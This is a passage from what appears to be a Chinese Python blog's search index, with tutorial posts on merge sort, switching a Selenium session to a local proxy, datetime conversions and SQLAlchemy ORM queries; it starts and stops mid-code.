class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MergeSort</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    归并排序</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    set() 设置可迭代对象及排序方式(大-&gt;小 or 小-&gt;大)</span></span><br><span class="line"><span class="string">    merge() 将有序的两边进行合并</span></span><br><span class="line"><span class="string">    sort() 递归左右两边</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(self, iterable, reverse=False)</span>:</span></span><br><span class="line">        self.iterable = iterable</span><br><span class="line">        self.reverse = reverse</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(self, left, mid, right)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        合并左右两边</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        left_index = left</span><br><span class="line">        right_index = mid + <span class="number">1</span></span><br><span class="line">        left_end = mid</span><br><span class="line">        right_end = right</span><br><span class="line"></span><br><span class="line">        tmp = []</span><br><span class="line">        <span class="keyword">while</span> left_index &lt;= left_end <span class="keyword">and</span> right_index &lt;= right_end:</span><br><span class="line">            <span class="keyword">if</span> self.iterable[left_index] &lt;= self.iterable[right_index]:</span><br><span class="line">                tmp.append(self.iterable[left_index])</span><br><span class="line">                left_index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp.append(self.iterable[right_index])</span><br><span class="line">                right_index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> left_index &lt;= left_end:</span><br><span class="line">            tmp.append(self.iterable[left_index])</span><br><span class="line">            left_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> right_index &lt;= right_end:</span><br><span class="line">            tmp.append(self.iterable[right_index])</span><br><span class="line">            right_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        tmp_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(left, right + <span class="number">1</span>):</span><br><span class="line">            self.iterable[i] = tmp[tmp_index]</span><br><span class="line">            tmp_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sort</span><span class="params">(self, left, right)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> left &gt;= right:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        self.sort(left, mid)</span><br><span class="line">        self.sort(mid + <span class="number">1</span>, right)</span><br><span class="line"></span><br><span class="line">        self.merge(left, mid, right)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">merge_sort</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sort(<span class="number">0</span>, len(self.iterable) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> self.reverse:</span><br><span class="line">            self.iterable.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lst1 = [<span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">100</span>, <span class="number">8</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">20</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    lst2 = [<span class="number">1</span>]</span><br><span class="line">    lst3 = []</span><br><span class="line">    lst4 = lst1[::]</span><br><span class="line">    merge_sort = MergeSort()</span><br><span class="line"></span><br><span class="line">    merge_sort.set(lst1)</span><br><span class="line">    merge_sort.merge_sort()</span><br><span class="line">    print(lst1)</span><br><span class="line"></span><br><span class="line">    merge_sort.set(lst2)</span><br><span class="line">    merge_sort.merge_sort()</span><br><span class="line">    print(lst2)</span><br><span class="line"></span><br><span class="line">    merge_sort.set(lst3)</span><br><span class="line">    merge_sort.merge_sort()</span><br><span class="line">    print(lst3)</span><br><span class="line"></span><br><span class="line">    merge_sort.set(lst4, reverse=<span class="keyword">True</span>)</span><br><span class="line">    merge_sort.merge_sort()</span><br><span class="line">    print(lst4)</span><br></pre></td></tr></table></figure><h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h2><p>后面再补…</p>]]></content>
      
      <categories>
          
          <category> 算法 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>selenium实现动态切换ip</title>
      <link href="/selenium%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E5%88%87%E6%8D%A2ip.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">就算回报远少于付出,那也还是得努力,不努力真的连一点回报都没有</blockquote><blockquote><p>selenium动态切换ip</p></blockquote><a id="more"></a><h2 id="selenium切换ip"><a href="#selenium切换ip" class="headerlink" title="selenium切换ip"></a>selenium切换ip</h2><p>切换demo如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser = webdriver.Chrome()</span><br><span class="line">    browser.get(<span class="string">'http://httpbin.org/ip'</span>)</span><br><span class="line">    print(<span class="string">'1: '</span>, browser.session_id)</span><br><span class="line">    print(<span class="string">'2: '</span>, browser.page_source)</span><br><span class="line">    print(<span class="string">'3: '</span>, browser.get_cookies())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 利用DesiredCapabilities(代理设置)参数值，重新打开一个sessionId，我看意思就相当于浏览器清空缓存后，加上代理重新访问一次url</span></span><br><span class="line">    proxy = webdriver.Proxy()</span><br><span class="line">    proxy.http_proxy = <span class="string">'127.0.0.1:1080'</span></span><br><span class="line">    <span class="comment"># 将代理设置添加到webdriver.DesiredCapabilities.PHANTOMJS中</span></span><br><span class="line">    proxy.add_to_capabilities(webdriver.DesiredCapabilities.CHROME)</span><br><span class="line">    browser.start_session(webdriver.DesiredCapabilities.CHROME)</span><br><span class="line">    browser.get(<span class="string">'http://httpbin.org/ip'</span>)</span><br><span class="line">    print(<span class="string">'1: '</span>, browser.session_id)</span><br><span class="line">    print(<span class="string">'2: '</span>, browser.page_source)</span><br><span class="line">    print(<span class="string">'3: '</span>, browser.get_cookies())</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e.args)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    browser.quit()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> selenium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> selenium </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>datetime与string、timetuple、timestamp之间的转换</title>
      <link href="/datetime%E4%B8%8Estring%E3%80%81timetuple%E3%80%81timestamp%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">生命有限，请浪费在更美好的事物上。</blockquote><blockquote><p>datetime经常要与string、timestamp进行转换,记录下以前的笔记,忘记时可以翻看</p></blockquote><a id="more"></a><h2 id="datetime-lt-gt-string"><a href="#datetime-lt-gt-string" class="headerlink" title="datetime&lt;=&gt;string"></a>datetime&lt;=&gt;string</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># %Y:年 %m:月 %d:日 %H:小时 %M:分钟 % S:秒</span></span><br><span class="line"><span class="comment"># datetime-&gt;string</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.datetime.now().strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line"><span class="string">'2018-07-03 13:49:26'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># string-&gt;datetime</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>datetime.datetime.strptime(<span class="string">'2018-07-03 13:49:26'</span>,<span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line">datetime.datetime(<span class="number">2018</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">49</span>, <span class="number">26</span>)</span><br></pre></td></tr></table></figure><h2 id="datetime-lt-gt-timetuple"><a href="#datetime-lt-gt-timetuple" class="headerlink" title="datetime&lt;=&gt;timetuple"></a>datetime&lt;=&gt;timetuple</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># datetime-&gt;timetuple</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timetuple = datetime.datetime.now().timetuple()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timetuple</span><br><span class="line">time.struct_time(tm_year=<span class="number">2018</span>, tm_mon=<span class="number">7</span>, tm_mday=<span class="number">3</span>, tm_hour=<span class="number">13</span>, tm_min=<span class="number">57</span>, tm_sec=<span class="number">1</span>, tm_wday=<span class="number">1</span>, tm_yday=<span class="number">184</span>, tm_isdst=<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># timetuple-&gt;datetime</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timestamp = time.mktime(timetuple)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timestamp</span><br><span class="line"><span class="number">1530597421.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tm = datetime.datetime.fromtimestamp(timestamp)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tm</span><br><span class="line">datetime.datetime(<span class="number">2018</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">57</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="datetime-lt-gt-timestamp"><a href="#datetime-lt-gt-timestamp" class="headerlink" title="datetime&lt;=&gt;timestamp"></a>datetime&lt;=&gt;timestamp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># datetime-&gt;timestamp</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timestamp = datetime.datetime.now().timestamp()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timestamp</span><br><span class="line"><span class="number">1530597698.058432</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># timestamp-&gt;datetime</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tm = datetime.datetime.fromtimestamp(timestamp)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tm</span><br><span class="line">datetime.datetime(<span class="number">2018</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">38</span>, <span class="number">58432</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> python </category>
          
          <category> datetime </category>
          
      </categories>
      
      
        <tags>
            
            <tag> datetime </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqlaLchemy--ORM常见操作</title>
      <link href="/sqlaLchemy--ORM%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">不做就别做，要做就坚持下去</blockquote><blockquote><p>记录下sqlalchemy中常用的操作，其它很多框架的ORM也是对sqlalchemy的包装，因此这些方法在框架中也是可用的<br><img src="http://p5m1dtoh7.bkt.clouddn.com/sqlaLchemy-ORM%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C/sqlalchemy.jpg" alt=""></p></blockquote><a id="more"></a><h2 id="后面代码中使用的模型"><a href="#后面代码中使用的模型" class="headerlink" title="后面代码中使用的模型"></a>后面代码中使用的模型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine, Column, Integer, String, ForeignKey</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> relationship, sessionmaker</span><br><span class="line"><span class="keyword">from</span> sqlalchemy.ext.declarative <span class="keyword">import</span> declarative_base</span><br><span class="line"></span><br><span class="line">engine = create_engine(<span class="string">'mysql://root:123456@127.0.0.1:3306/test1?charset=utf8'</span>)</span><br><span class="line">Base = declarative_base()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'users'</span></span><br><span class="line"></span><br><span class="line">    id = Column(Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    name = Column(String(<span class="number">100</span>))</span><br><span class="line">    fullname = Column(String(<span class="number">100</span>))</span><br><span class="line">    password = Column(String(<span class="number">100</span>))</span><br><span class="line">addresses = relationship(<span class="string">"Address"</span>, backref=<span class="string">"user"</span>,cascade=<span class="string">"all, delete, delete-orphan"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;User(name='%s', fullname='%s', password='%s')&gt;"</span> % (</span><br><span class="line">            self.name, self.fullname, self.password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Address</span><span class="params">(Base)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'addresses'</span></span><br><span class="line">    id = Column(Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    email_address = Column(String(<span class="number">100</span>), nullable=<span class="keyword">False</span>)</span><br><span class="line">    user_id = Column(Integer, ForeignKey(<span class="string">'users.id'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;Address(email_address='%s')&gt;"</span> % self.email_address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Base.metadata.create_all(engine)</span><br><span class="line">Session = sessionmaker(bind=engine)</span><br><span class="line"></span><br><span class="line">session = Session()</span><br></pre></td></tr></table></figure><h2 id="添加-更新-删除对象"><a href="#添加-更新-删除对象" class="headerlink" title="添加/更新/删除对象"></a>添加/更新/删除对象</h2><h3 id="添加对象"><a href="#添加对象" class="headerlink" title="添加对象"></a>添加对象</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>wu_user = User(name=<span class="string">'wu'</span>,fullname=<span class="string">'wu xxx xxxx'</span>,password=<span class="string">'abcdef'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.add(wu_user)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user = session.query(User).filter_by(name=<span class="string">'wu'</span>).first()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user</span><br><span class="line">&lt;User(name=<span class="string">'wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>wu_user <span class="keyword">is</span> user</span><br><span class="line"><span class="keyword">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user.name</span><br><span class="line"><span class="string">'wu'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user.fullname</span><br><span class="line"><span class="string">'wu xxx xxxx'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user.password</span><br><span class="line"><span class="string">'abcdef'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.commit()</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="更新对象"><a href="#更新对象" class="headerlink" title="更新对象"></a>更新对象</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>wu_user.name = <span class="string">'wu wu'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.add(wu_user)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.commit()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user = session.query(User).filter_by(name=<span class="string">'wu wu'</span>).first()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user</span><br><span class="line">&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.delete(jack)</span><br><span class="line">session.commit()</span><br></pre></td></tr></table></figure><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><ol><li><p>基本查询</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> instance <span class="keyword">in</span> session.query(User).order_by(User.id):</span><br><span class="line">print(instance.name, instance.fullname)</span><br><span class="line">wu wu wu xxx xxxx</span><br><span class="line">hu hu xxx xxxx</span><br><span class="line">qi qi xxx xxxx</span><br><span class="line">hg hg xxx xxxx</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).order_by(User.id))) <span class="comment"># 可以通过str查看执行的sql语句</span></span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users ORDER BY users.id</span><br></pre></td></tr></table></figure></li><li><p>可以直接指定要查询的字段，此时查询返回的是一个<code>KeyedTuple</code>对象，可以当做元组那样对待:</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> name, fullname <span class="keyword">in</span> session.query(User.name, User.fullname):</span><br><span class="line">print(name, fullname)</span><br><span class="line">wu wu wu xxx xxxx</span><br><span class="line">hu hu xxx xxxx</span><br><span class="line">qi qi xxx xxxx</span><br><span class="line">hg hg xxx xxxx</span><br></pre></td></tr></table></figure></li><li><p>通过<code>lable</code>为字段命别名:</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> row <span class="keyword">in</span> session.query(User.name.label(<span class="string">'name_label'</span>)).all():</span><br><span class="line">print(row.name_label)</span><br><span class="line">wu wu</span><br><span class="line">hu</span><br><span class="line">qi</span><br><span class="line">hg</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User.name.label(<span class="string">'name_label'</span>))))</span><br><span class="line">SELECT users.name AS name_label </span><br><span class="line">FROM users</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></li><li><p>aliased为实体命别名:</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sqlalchemy.orm <span class="keyword">import</span> aliased</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user_alias = aliased(User, name=<span class="string">'user_alias'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> row <span class="keyword">in</span> session.query(user_alias, user_alias.name).all():</span><br><span class="line">print(row.user_alias)</span><br><span class="line">&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line">&lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(user_alias, user_alias.name)))</span><br><span class="line">SELECT user_alias.id AS user_alias_id, user_alias.name AS user_alias_name, user_alias.fullname AS user_alias_fullname, user_alias.password AS user_alias_password </span><br><span class="line">FROM users AS user_alias</span><br></pre></td></tr></table></figure></li><li><p>limit offset 指定偏移和结果数目</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).order_by(User.id).limit(<span class="number">2</span>).offset(<span class="number">1</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).order_by(User.id).limit(<span class="number">2</span>).offset(<span class="number">1</span>)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users ORDER BY users.id </span><br><span class="line"> LIMIT %s, %s</span><br></pre></td></tr></table></figure></li><li><p>Query对象是完全生成的，他返回的是一个新的Query对象，可继续使用查询语句</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> user <span class="keyword">in</span> session.query(User).\</span><br><span class="line">filter(User.name==<span class="string">'hu'</span>).\</span><br><span class="line">filter(User.fullname==<span class="string">'hu xxx xxxx'</span>):</span><br><span class="line">print(user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name==<span class="string">'hu'</span>).filter(User.fullname==<span class="string">'hu xxx xxxx'</span>)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name = %s AND users.fullname = %s</span><br></pre></td></tr></table></figure><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ol><li>equals/not equals</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># euqals</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name == <span class="string">'wu wu'</span>).first()</span><br><span class="line">&lt;User(name=<span class="string">'wu wu'</span>, fullname=<span class="string">'wu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name == <span class="string">'wu wu'</span>)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name = %s</span><br><span class="line"></span><br><span class="line"><span class="comment"># not equals</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>session.query(User).filter(User.name != <span class="string">'wu wu'</span>).all()</span><br><span class="line">[&lt;User(name=<span class="string">'hu'</span>, fullname=<span class="string">'hu xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'qi'</span>, fullname=<span class="string">'qi xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;, &lt;User(name=<span class="string">'hg'</span>, fullname=<span class="string">'hg xxx xxxx'</span>, password=<span class="string">'abcdef'</span>)&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(session.query(User).filter(User.name != <span class="string">'wu wu'</span>)))</span><br><span class="line">SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password </span><br><span class="line">FROM users </span><br><span class="line">WHERE users.name != %s</span><br></pre></td></tr></table></figure><ol><li>like/ilike</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 